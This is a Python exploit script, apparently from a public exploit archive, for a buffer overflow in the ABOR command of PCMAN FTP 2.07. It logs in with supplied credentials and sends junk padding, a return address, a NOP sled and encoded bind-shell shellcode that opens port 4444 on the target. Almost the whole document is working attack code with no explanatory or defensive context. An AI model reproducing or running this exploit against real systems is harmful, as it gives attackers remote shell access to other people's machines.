# Exploit Title: PCMAN FTP 2.07 ABOR Command Buffer Overflow
# Date: Jan 25,2014
# Exploit Author: Mahmod Mahajna (Mahy)
# Version: 2.07
# Tested on: Windows 7 sp1 x64 (english)
# Email: m.dofo123@gmail.com
import socket as s
from sys import argv
#
if(len(argv) != 4):
    print \"USAGE: %s host <user> <password>\" % argv[0]
    exit(1)
else:
    #store command line arguments
    script,host,fuser,fpass=argv
    #vars
    junk = \'\\x41\' * 2011 #overwrite function (ABOR) with garbage/junk chars
    espaddress = \'\\x59\\x06\\xbb\\x76\' # 76BB0659
    nops = \'\\x90\' * 10
    shellcode = ( # BIND SHELL | PORT 4444
        \"\\x31\\xc9\\xdb\\xcd\\xbb\\xb3\\x93\\x96\\x9d\\xb1\\x56\\xd9\\x74\\x24\\xf4\"
        \"\\x5a\\x31\\x5a\\x17\\x83\\xea\\xfc\\x03\\x5a\\x13\\x51\\x66\\x6a\\x75\\x1c\"
        \"\\x89\\x93\\x86\\x7e\\x03\\x76\\xb7\\xac\\x77\\xf2\\xea\\x60\\xf3\\x56\\x07\"
        \"\\x0b\\x51\\x43\\x9c\\x79\\x7e\\x64\\x15\\x37\\x58\\x4b\\xa6\\xf6\\x64\\x07\"
        \"\\x64\\x99\\x18\\x5a\\xb9\\x79\\x20\\x95\\xcc\\x78\\x65\\xc8\\x3f\\x28\\x3e\"
        \"\\x86\\x92\\xdc\\x4b\\xda\\x2e\\xdd\\x9b\\x50\\x0e\\xa5\\x9e\\xa7\\xfb\\x1f\"
        \"\\xa0\\xf7\\x54\\x14\\xea\\xef\\xdf\\x72\\xcb\\x0e\\x33\\x61\\x37\\x58\\x38\"
        \"\\x51\\xc3\\x5b\\xe8\\xa8\\x2c\\x6a\\xd4\\x66\\x13\\x42\\xd9\\x77\\x53\\x65\"
        \"\\x02\\x02\\xaf\\x95\\xbf\\x14\\x74\\xe7\\x1b\\x91\\x69\\x4f\\xef\\x01\\x4a\"
        \"\\x71\\x3c\\xd7\\x19\\x7d\\x89\\x9c\\x46\\x62\\x0c\\x71\\xfd\\x9e\\x85\\x74\"
        \"\\xd2\\x16\\xdd\\x52\\xf6\\x73\\x85\\xfb\\xaf\\xd9\\x68\\x04\\xaf\\x86\\xd5\"
        \"\\xa0\\xbb\\x25\\x01\\xd2\\xe1\\x21\\xe6\\xe8\\x19\\xb2\\x60\\x7b\\x69\\x80\"
        \"\\x2f\\xd7\\xe5\\xa8\\xb8\\xf1\\xf2\\xcf\\x92\\x45\\x6c\\x2e\\x1d\\xb5\\xa4\"
        \"\\xf5\\x49\\xe5\\xde\\xdc\\xf1\\x6e\\x1f\\xe0\\x27\\x20\\x4f\\x4e\\x98\\x80\"
        \"\\x3f\\x2e\\x48\\x68\\x2a\\xa1\\xb7\\x88\\x55\\x6b\\xce\\x8f\\x9b\\x4f\\x82\"
        \"\\x67\\xde\\x6f\\x34\\x2b\\x57\\x89\\x5c\\xc3\\x31\\x01\\xc9\\x21\\x66\\x9a\"
        \"\\x6e\\x5a\\x4c\\xb6\\x27\\xcc\\xd8\\xd0\\xf0\\xf3\\xd8\\xf6\\x52\\x58\\x70\"
        \"\\x91\\x20\\xb2\\x45\\x80\\x36\\x9f\\xed\\xcb\\x0e\\x77\\x67\\xa2\\xdd\\xe6\"
        \"\\x78\\xef\\xb6\\x8b\\xeb\\x74\\x47\\xc2\\x17\\x23\\x10\\x83\\xe6\\x3a\\xf4\"
        \"\\x39\\x50\\x95\\xeb\\xc0\\x04\\xde\\xa8\\x1e\\xf5\\xe1\\x31\\xd3\\x41\\xc6\"
        \"\\x21\\x2d\\x49\\x42\\x16\\xe1\\x1c\\x1c\\xc0\\x47\\xf7\\xee\\xba\\x11\\xa4\"
        \"\\xb8\\x2a\\xe4\\x86\\x7a\\x2d\\xe9\\xc2\\x0c\\xd1\\x5b\\xbb\\x48\\xed\\x53\"
        \"\\x2b\\x5d\\x96\\x8e\\xcb\\xa2\\x4d\\x0b\\xfb\\xe8\\xcc\\x3d\\x94\\xb4\\x84\"
        \"\\x7c\\xf9\\x46\\x73\\x42\\x04\\xc5\\x76\\x3a\\xf3\\xd5\\xf2\\x3f\\xbf\\x51\"
        \"\\xee\\x4d\\xd0\\x37\\x10\\xe2\\xd1\\x1d\\x1a\\xcd\")
    sploit = junk+espaddress+nops+shellcode
    #create socket
    conn = s.socket(s.AF_INET,s.SOCK_STREAM)
    #establish connection to server
    conn.connect((host,21))
    #post ftp user
    conn.send(\'USER \'+fuser+\'\\r\\n\')
    #wait for response
    uf = conn.recv(1024)
    #post ftp password
    conn.send(\'PASS \'+fpass+\'\\r\\n\')
    #wait for response
    pf = conn.recv(1024)
    #send ftp command with sploit
    conn.send(\'ABOR \'+sploit+\'\\r\\n\')
    cf = conn.recv(1024)
    #close connection
    conn.close()
    
    
	
